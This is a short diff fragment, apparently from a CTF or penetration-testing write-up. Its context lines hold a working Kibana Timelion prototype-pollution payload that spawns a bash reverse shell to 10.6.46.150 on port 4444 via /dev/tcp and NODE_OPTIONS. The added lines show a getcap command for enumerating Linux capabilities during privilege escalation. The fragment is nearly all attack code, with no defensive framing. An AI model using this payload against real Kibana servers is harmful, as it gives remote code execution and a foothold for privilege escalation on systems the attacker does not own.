@@ -123,3 +123,7 @@ TL;DR We run netcat and inject a payload in Timelion:
 .es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -c \'bash -i>& /dev/tcp/10.6.46.150/4444 0>&1\'");//')
 .props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
 ```
+
+*
+FINDING CAPABILITIES
+`getcap -r / 2>/dev/null` 
